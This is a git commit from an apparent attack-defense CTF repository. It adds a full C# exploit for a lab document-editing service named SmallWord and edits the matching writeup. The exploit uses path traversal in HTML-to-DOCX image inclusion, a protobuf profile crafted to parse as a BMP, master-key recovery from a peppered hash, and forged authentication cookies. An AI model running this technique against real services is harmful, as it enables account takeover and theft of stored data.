1b6c53aa48de684ad52880f14e5d3a2070c04dd2
Dmitriy Titarenko <mail.dscheg@gmail.com>
2022-08-26 07:15:32 +0500

    [smallword] exploit and writeup fixes

---
+++ sploits/smallword/Program.cs
@@ -0,0 +1,188 @@
+﻿using System.Drawing;
+using System.IO.Compression;
+using System.Net;
+using System.Net.Http.Json;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.Json;
+using System.Text.Json.Serialization;
+using System.Text.RegularExpressions;
+using Microsoft.AspNetCore.Cryptography.KeyDerivation;
+using ProtoBuf;
+
+if(!BitConverter.IsLittleEndian)
+    throw new Exception("Little-endian architecture expected");
+
+var BaseUri = new Uri(args.Length == 0 ? "http://127.0.0.1:5000/" : args[0]);
+
+var cookies = new CookieContainer();
+var client = new HttpClient(new HttpClientHandler {UseCookies = true, CookieContainer = cookies}) {BaseAddress = BaseUri};
+var settings = new JsonSerializerOptions
+{
+    PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
+    DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingDefault,
+    IncludeFields = true
+};
+
+const char Padding1 = 'A';
+const char Padding2 = 'B';
+
+const int FieldByteLength = 'M'; /* Proto field of type string with number 8 encoded as 0x42 ('B') - the first byte,
+                                  * the second byte is the length of the byte string, this two bytes create 'BM' - BMP file magic prefix */
+
+ int BmpSize = 260; /* We need at least BMP_HEADER + SALT + PASSWORD_HASH + LOGIN + PATRONYMIC length here to get master key secret,
+                     * also size must be less than the total proto file size. Also note that we need all bytes in our BMP header
+                     * with most significant bit cleared to make all characters in UTF8 use only 1 byte (!) */
+
+var bmp = StructToBytes(new Bmp((uint)(Marshal.SizeOf<Bmp>() + BmpSize), (ushort)(BmpSize / 3) /* 24bpp */, 1));
+Console.WriteLine($"BMP header: {BitConverter.ToString(bmp)}");
+
+// Check all chars in BMP header use 1 byte in UTF8
+if(Encoding.UTF8.GetByteCount(Encoding.UTF8.GetString(bmp)) != bmp.Length)
+    throw new Exception("BMP header must contain only ASCII chars");
+
+var user = new User
+{
+    Login = RandomNumberGenerator.GetInt32(int.MinValue, int.MaxValue).ToString("x8"),
+    Password = Guid.NewGuid().ToString(),
+
+    // Remove magic prefix 'BM' because it will be coded in protobuf by serializing string field with length 'M' (0x4D)
+    Patronymic = Encoding.UTF8.GetString(bmp)[2..] + new string(Padding1, FieldByteLength - (bmp.Length - 2)),
+
+    // Some padding to get total proto file greater than bmpSize, all data after bmpSize is ignored by BMP parsers
+    Hobby = new string(Padding2, 256)
+};
+
+await client.PostAsJsonAsync("/register", user, settings);
+
+var fileId = Guid.NewGuid();
+
+// Exploit path traversal in Open-XML-PowerTools lib to include self proto serialized profile as an image
+await client.PutAsync($"/file/{fileId}", new StringContent("<img src='../profile'/>"));
+
+// Export file as docx
+await using var stream = await client.GetStreamAsync($"/file/{fileId}?export=true");
+
+// Read docx as zip-archive and extract image
+using var archive = new ZipArchive(stream, ZipArchiveMode.Read);
+var imageEntry = archive.Entries.FirstOrDefault(entry => entry.FullName.StartsWith("media", StringComparison.OrdinalIgnoreCase));
+if(imageEntry == null)
+    throw new Exception("No image inserted");
+
+var img = new Bitmap(imageEntry.Open());
+
+// Extract image bitmap data
+var data = Enumerable.Range(0, img.Width).Select(i => img.GetPixel(i, 0)).SelectMany(color => new[] {color.B, color.G, color.R}).ToArray();
+Console.WriteLine("Bitmap data: " + BitConverter.ToString(data));
+
+// Trim paddings, extract proto serialized password part
+var memory = new Memory<byte>(data).TrimStart((byte)Padding1).TrimEnd((byte)Padding2);
+memory = memory.Slice(0, memory.Length - 3 /* length of the proto serialized Hobby field header */);
+Console.WriteLine(BitConverter.ToString(memory.ToArray()));
+
+var result = Serializer.Deserialize<User>(memory);
+Console.WriteLine($"Salt: {BitConverter.ToString(result.Salt)}");
+Console.WriteLine($"Hash: {BitConverter.ToString(result.PasswordHash)}");
+
+const int KeySize = 24;
+
+// Master key is used as a pepper and XORed with password hash before persisting user profile, so XOR known hash with leaked hash to recover THE MASTER KEY 
+var hash = HashPassword(user.Password, result.Salt, new byte[KeySize]);
+var masterKey = hash.Select((b, i) => (byte)(b ^ result.PasswordHash[i])).Take(KeySize).ToArray();
+Console.WriteLine($"THE MASTER KEY: {Convert.ToBase64String(masterKey)}");
+
+var flagRegex = new Regex(@"TEAM\d+_[A-Z0-9]{32}", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+
+string? line;
+while((line = Console.ReadLine()) != null) // Obtaining flags
+{
+    var parts = line.Trim().Split('@');
+    fileId = new Guid(parts[0]);
+    var login = parts[1];
+
+    var auth = Uri.EscapeDataString($"{login} {Convert.ToBase64String(Hmac(login, masterKey))}");
+    Console.WriteLine($"Auth cookie: {auth}");
+
+    cookies.SetCookies(BaseUri, "auth=" + auth);
+    Console.WriteLine(flagRegex.Matches(await client.GetStringAsync($"/file/{fileId}"))
+        .Select(match => match.Value)
+        .FirstOrDefault());
+}
+
+#region ServiceAuthMethods
+
+byte[] HashPassword(string password, byte[] salt, byte[] pepper)
+    => KeyDerivation.Pbkdf2(password, salt, KeyDerivationPrf.HMACSHA256, iterationCount: 7, 256 / 8).Select((b, i) => (byte)(b ^ pepper[i % pepper.Length])).ToArray();
+
+Guid ToUserId(string login)
+    => new(SHA256.HashData(Encoding.UTF8.GetBytes(login))[..16]);
+
+byte[] Hmac(string login, byte[] key)
+    => HMACSHA256.HashData(key, ToUserId(login).ToByteArray());
+
+#endregion
+
+byte[] StructToBytes<T>(T value) where T : unmanaged
+{
+    var ptr = IntPtr.Zero;
+    var structSize = Marshal.SizeOf(typeof(T));
+    try
+    {
+        ptr = Marshal.AllocHGlobal(structSize);
+        Marshal.StructureToPtr(value, ptr, false);
+        var bytes = new byte[structSize];
+        Marshal.Copy(ptr, bytes, 0, structSize);
+        return bytes;
+    }
+    finally
+    {
+        if(ptr != IntPtr.Zero)
+            Marshal.FreeHGlobal(ptr);
+    }
+}
+
+// https://en.wikipedia.org/wiki/BMP_file_format
+[StructLayout(LayoutKind.Sequential, Pack = 1)]
+struct Bmp
+{
+    public Bmp(uint size, ushort width, ushort height)
+    {
+        ByteLength = size;
+        Width = width;
+        Height = height;
+    }
+
+    // BMP file header
+    ushort Magic = 0x4D42;      // BM in ASCII (little-endian)
+    uint ByteLength;            // The size of the BMP file in bytes
+    ushort Reserved1 = 0;       // Reserved; actual value depends on the application that creates the image
+    ushort Reserved2 = 0;       // Reserved; actual value depends on the application that creates the image
+    uint DataOffset = 0x1A;     // The offset of the byte where the bitmap image data (pixel array) can be found
+
+    // DIB header
+    uint HeaderSize = 0x0C;
+    ushort Width;
+    ushort Height;
+    ushort ColorPlanes = 0x01;  // The number of color planes (must be 1)
+    ushort BitDepth = 0x18;     // Use 24bpp here because server converting may drop alpha channel
+}
+
+[ProtoContract] // Copy-paste from the service
+public class User
+{
+    [ProtoMember(1)] public DateTime? BirthDate;
+    [ProtoMember(2)] public string? Gender;
+    [ProtoMember(3)] public string? Country;
+    [ProtoMember(4)] public string? Company;
+    [ProtoMember(5)] public string? Address;
+    [ProtoMember(6)] public string? Name;
+    [ProtoMember(7)] public string? Surname;
+    [ProtoMember(8)] public string? Patronymic;
+    [ProtoMember(9)] public string? Login;
+    [ProtoIgnore] public string? Password;
+    [JsonIgnore] [ProtoMember(10)] public byte[]? Salt;
+    [JsonIgnore] [ProtoMember(11)] public byte[]? PasswordHash;
+    [ProtoMember(12)] public string? Hobby;
+    [ProtoMember(13)] public DateTime Created;
+}
--- writeups/smallword/README.md
+++ writeups/smallword/README.md
@@ -3,7 +3,7 @@
 ## Description
 SmallWord is a service for editing documents and exporting it to DOCX. The service is written in C# and uses files as a persistent storage.
 
-![SmallWord](img/smallword.png)
+![SmallWord](smallword.png)
 
 List of available endpoints:
 * /login — login by password;
@@ -17,15 +17,15 @@ Including user profile into DOCX as an image through a path traversal in open so
 
 ## Exploitation
 
-There were some "hints" for the service in a code:
-* Master key [XOR'ing](../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/UserProfile.cs#L148) (as a pepper) with password hash => if someone get the possibility to connect the file to the DOCX, he will be able to steal the master key;
-* [System.Drawing.Common](../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/smallword.csproj#L13) in deps, checker adds image on each PUT;
-* Setting a some [base URI](../../blob/8d132cb4b86c69ac8bf557f4b3c62b03c43ce98a/services/smallword/src/Converter.cs#L13) for images, BTW there is no legal way to put such images;
-* Weird large number of [useless fields](../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/UserProfile.cs#L12) in user profile.
+There are some "hints" for the service in a code:
+* Master key [XOR'ing](../../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/UserProfile.cs#L148) (as a pepper) with password hash => if someone get the possibility to connect the file to the DOCX, he will be able to steal the master key;
+* Setting a some [base URI](../../../blob/8d132cb4b86c69ac8bf557f4b3c62b03c43ce98a/services/smallword/src/Converter.cs#L13) for images, BTW there is no way to put such images;
+* [System.Drawing.Common](../../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/smallword.csproj#L13) in deps, checker adds image on each PUT;
+* Weird large number of [useless fields](../../../blob/583540b5e7421beaeef6648fe3e21dd54c8d407e/services/smallword/src/UserProfile.cs#L12) in user profile.
 
 Let's go in order
 
-### Password hashes
+### Password hashing
 
 Here is a function for hashing a password:
 ```cs
@@ -45,7 +45,7 @@ The service uses a master key as a pepper, so an attacker who steals a user prof
 The most dangerous functionality in the service is the HTML-to-DOCX conversion. The input HTML in the service is parsed as XML, the DOCX is also archived XML, and DOCX can include various types of nested objects.
 So it seems quite logical to check the service for XXE, SSRF and including files from disk during conversion.
 
-XML reading [settings](../../blob/8d132cb4b86c69ac8bf557f4b3c62b03c43ce98a/services/smallword/src/Converter.cs#L36) are quite strict, not allowing us to achieve XXE. It also seems unlikely that the XXE vuln is present in the library when converting from HTML to DOCX.
+XML reading [settings](../../../blob/8d132cb4b86c69ac8bf557f4b3c62b03c43ce98a/services/smallword/src/Converter.cs#L36) are quite strict, not allowing us to achieve XXE. It also seems unlikely that the XXE vuln is present in the library when converting from HTML to DOCX.
 ```cs
 XmlResolver = null,
 DtdProcessing = DtdProcessing.Prohibit,
@@ -78,14 +78,33 @@ lead us to inclusion a user profile as an image. The problem is this profile mus
 
 ### Creating protobufed Bitmap
 
-We need to generate such user profile which can be loaded as a correct image by `Bitmap` class.
-`Bitmap` class in code snippet above uses `System.Drawing.Common` library, which [uses](https://docs.microsoft.com/en-us/dotnet/core/compatibility/core-libraries/6.0/system-drawing-common-windows-only#reason-for-change) libgdiplus as a cross-platform backend.
+We need to generate such user profile which can be loaded as a correct image by `Bitmap` class, which uses `System.Drawing.Common` library, which [uses](https://docs.microsoft.com/en-us/dotnet/core/compatibility/core-libraries/6.0/system-drawing-common-windows-only#reason-for-change) `libgdiplus` as a cross-platform backend.
 `GDI+` and its implementation `libgdiplus` [supports](https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/gdiplus/-gdiplus-using-image-encoders-and-decoders-use.md) this list of formats: BMP, GIF, JPEG, PNG, TIFF, WMF, EMF, ICON.
 WMF and EMF seems too complicated file formats to use in such exploitation. ICON file must start with two 0x00, which seems impossible with protobuf serialization.
 
-In the list of the rest formats BMP is the simplest, so try it. The most important thing here - we must get first bytes of protobuf field header to be serialized as a file prefix.
-After some experiments it is found that a `string` type field with the number `8` in protobuf serialized with prefix `0x42` (`B`). The length `0x4D` (`M`) of the 8th field give us a `BM`, and the rest of the string can encode the rest of the BMP header.
+In the list of the rest formats BMP is the simplest, so try it. Here is a [BMP header](https://en.wikipedia.org/wiki/BMP_file_format#Bitmap_file_header) struct:
+```cs
+struct Bmp
+{
+    // BMP file header
+    ushort Magic = 0x4D42;      // BM in ASCII (little-endian)
+    uint ByteLength;            // The size of the BMP file in bytes
+    ushort Reserved1 = 0;       // Reserved; actual value depends on the application that creates the image
+    ushort Reserved2 = 0;       // Reserved; actual value depends on the application that creates the image
+    uint DataOffset = 0x1A;     // The offset of the byte where the bitmap image data (pixel array) can be found
+
+    // DIB header
+    uint HeaderSize = 0x0C;
+    ushort Width;
+    ushort Height;
+    ushort ColorPlanes = 0x01;  // The number of color planes (must be 1)
+    ushort BitDepth = 0x18;     // Use 24bpp here because server converting may drop alpha channel
+}
+```
+
+The most important thing here - we must get first two bytes of protobuf field header to be serialized as a file prefix.
+After some experiments it can be found that a `string` type field with the number `8` in protobuf serialized with prefix `0x42` (`B`). The length `0x4D` (`M`) of the 8th field give us a `BM`, and the rest of the string can encode the rest of the BMP header.
 So, thats it! We can use `patronymic` field to generate a prefix of the bitmap, and the rest fields (including password hash and salt) will be the bitmap data, which can be read from image in DOCX converted from HTML.
 
 Also there are some pitfalls which we should take into account for example with UTF-8 encoding which is used to parse JSON serialized request of registration new user and so on.
-You can see full exploit here: [EXPLOIT](../../blob/main/sploits/smallword/Program.cs)
+You can see full exploit here: [EXPLOIT](../../../blob/main/sploits/smallword/Program.cs)
